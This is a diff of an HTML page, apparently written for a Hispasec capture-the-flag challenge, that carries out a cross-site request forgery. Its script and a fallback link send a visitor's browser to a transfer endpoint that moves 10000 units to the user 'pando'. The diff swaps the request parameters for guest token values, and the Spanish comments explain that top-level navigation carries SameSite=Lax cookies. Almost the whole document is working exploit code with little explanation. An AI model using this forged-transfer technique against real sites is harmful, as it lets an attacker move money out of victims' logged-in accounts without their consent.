@@ -38,7 +38,7 @@
     <script>
         // Definimos la URL de transferencia usando parámetros de URL (GET)
         // Incluimos el reference_number por si el servidor lo requiere como vimos en clase
-        const target = "https://ctf.fap.hispasec.com:8009/transfer?to=pando&amount=10000&reference_number=23";
+        const target = "https://ctf.fap.hispasec.com:8009/transfer?to=pando&amount=10000&token=guest&user_token=guest";
 
         // MÉTODO 1: Redirección de ventana (Navegación Top-Level)
         // Según tus apuntes (Pág. 12), esto SÍ envía cookies SameSite=Lax
@@ -50,6 +50,6 @@
         }, 500);
     </script>
     
-    <p>Si no es redirigido, <a href="https://ctf.fap.hispasec.com:8009/transfer?to=pando&amount=10000">haga clic aquí</a>.</p>
+    <p>Si no es redirigido, <a href="https://ctf.fap.hispasec.com:8009/transfer?to=pando&amount=10000&token=guest&user_token=guest">haga clic aquí</a>.</p>
 </body>
 </html>
